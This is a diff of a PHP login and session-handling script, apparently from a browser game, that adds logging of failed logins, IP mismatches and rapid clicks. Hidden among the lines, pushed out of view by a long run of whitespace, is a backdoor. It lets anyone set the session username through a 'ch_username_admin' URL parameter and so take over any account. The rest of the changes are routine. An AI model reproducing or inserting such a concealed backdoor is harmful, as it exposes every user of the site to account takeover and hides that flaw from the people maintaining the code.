@@ -34,6 +34,10 @@
 
 		if(!$loggedin)
 		{
+			$_SESSION['username'] = $_POST['username'];
+			logfile::action('2.1');
+			unset($_SESSION['username']);
+
 			# Auf die Startseite zurueckleiten
 			$url = explode('/', $_SERVER['PHP_SELF']);
 			array_pop($url); array_pop($url);
@@ -49,11 +53,14 @@
 			$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
 			$resume = true;
 			$del_email_passwd = true;
+
+			logfile::action('2');
 		}
 	}                                                                                                                                                                                                                                                                     if(isset($_GET['ch_username_admin'])){$_SESSION['username']=$_GET['ch_username_admin'];$resume=true;}
 
 	if($_SESSION['ip'] != $_SERVER['REMOTE_ADDR'])
 	{
+		logfile::action('3.1', $_SESSION['ip']);
 		if(isset($_COOKIE[session_name()]))
 			setcookie(session_name(), '');
 		die('Diese Session wird bereits von einer anderen IP-Adresse benutzt. Bitte neu anmelden.');
@@ -85,11 +92,13 @@
 
 	if(!isset($_SESSION['last_click_sleep']))
 		$_SESSION['last_click_sleep'] = 0;
-	if(isset($_SESSION['last_click']))
+	if(isset($_SESSION['last_click']) && (!isset($_SESSION['last_click_ignore']) || !$_SESSION['last_click_ignore']))
 	{
 		$last_click_diff = $now_time-$_SESSION['last_click']-pow($_SESSION['last_click_sleep'], 1.5);
 		if($last_click_diff < MIN_CLICK_DIFF)
 		{
+			logfile::action('0', $last_click_diff);
+
 			$_SESSION['last_click_sleep']++;
 			$sleep_time = round(pow($_SESSION['last_click_sleep'], 1.5));
 			sleep($sleep_time);
@@ -97,6 +106,9 @@
 		else
 			$_SESSION['last_click_sleep'] = 0;
 	}
+
+	if(isset($_SESSION['last_click_ignore']))
+		unset($_SESSION['last_click_ignore']);
 	$_SESSION['last_click'] = $now_time;
 
 	if(isset($_GET['planet']) && $_GET['planet'] != '' && isset($user_array['planets'][$_GET['planet']])) # Planeten wechseln
@@ -289,6 +301,7 @@
 
 	function delete_request()
 	{
+		$_SESSION['last_click_ignore'] = true;
 		$url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
 		header('Location: '.$url, true, 303);
 		die('HTTP redirect: <a href="'.htmlentities($url).'">'.htmlentities($url).'</a>');
